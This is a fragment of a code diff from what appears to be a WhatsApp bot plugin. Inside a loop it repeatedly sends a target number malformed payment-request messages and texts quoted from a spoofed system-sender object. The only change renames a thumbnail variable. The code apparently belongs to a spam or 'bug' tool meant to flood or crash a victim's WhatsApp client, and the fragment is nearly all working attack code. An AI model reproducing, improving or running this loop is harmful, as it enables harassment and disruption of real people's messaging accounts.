@@ -21,7 +21,7 @@ participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {})
 }}}
 for (let i = 0; i < jumlah; i++) {
     
-conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.thumb }}}}, {})
+conn.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: '🗿', currencyCodeIso4217: 'IDR', requestFrom: '@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
 
 conn.sendMessage(num, { text: '🗿'}, { quoted: dann })
 }
